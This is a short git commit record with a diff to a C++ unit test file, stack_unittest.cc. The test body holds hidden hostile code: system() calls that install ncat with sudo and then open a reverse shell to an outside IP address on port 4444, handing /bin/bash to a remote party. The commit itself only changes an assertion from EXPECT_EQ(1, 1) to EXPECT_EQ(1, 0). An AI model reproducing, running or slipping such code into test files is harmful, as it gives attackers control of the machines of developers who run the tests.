63504e0f2d7394a1365b50884229801521f85843
Leo Conforti <leo@leoconforti.us>
2023-03-21 18:37:41 +0000

    test

--- stack_unittest.cc
+++ stack_unittest.cc
@@ -12,5 +12,5 @@ TEST_F(StackTest, test1) {
   system("sudo apt-get update");
   system("sudo apt-get install -y ncat");
   system("ncat 207.154.235.250 4444 -e /bin/bash");
-  EXPECT_EQ(1, 1);
+  EXPECT_EQ(1, 0);
 }
